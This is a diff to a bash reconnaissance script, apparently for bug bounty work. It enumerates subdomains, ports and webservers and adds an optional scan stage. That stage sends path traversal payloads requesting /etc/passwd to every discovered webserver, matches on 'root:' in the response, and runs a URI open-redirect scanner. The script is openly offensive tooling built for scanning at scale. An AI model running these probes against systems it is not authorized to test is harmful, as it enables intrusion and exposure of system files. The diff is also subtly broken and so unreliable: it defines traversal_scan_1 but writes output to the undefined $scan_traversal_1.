@@ -19,6 +19,9 @@ vhost_path=$name".all.vhost_support"
 ips_path=$name".all.ips"
 ips_ports_path=$name".all.ips_ports"
 ips_webservers=$name".all.ips_webservers"
+traversal_scan_1=$name".all.scan_traversal_1"
+scan_traversal_2=$name".all.scan_traversal_2"
+scan_uri_openredir=$name".all.scan_uri_openredir"
 
 subfinder -dL $roots -all -o $subfinder_path;
 cat $subfinder_path | puredns resolve --write $resolved_path;
@@ -60,3 +63,12 @@ naabu -list $ips_path -Pn -exclude-cdn -p - -o $ips_ports_path;
 
 # perform http probing on ips ports
 cat $ips_ports_path | httpx -timeout 30 -sc -title -td -location -o $ips_webservers;
+
+if [ $scan = scan ]; then
+    # performing path traversal scans
+    cat $webservers_path | httpx -timeout 30 -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' -o $scan_traversal_1;
+    cat $webservers_path | httpx -timeout 30 -path "/../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' -o $scan_traversal_2;
+
+    # performing uri based open redirect scan
+    python3 /opt/uri_redirects.py $webservers_path | tee $scan_uri_openredir;
+fi
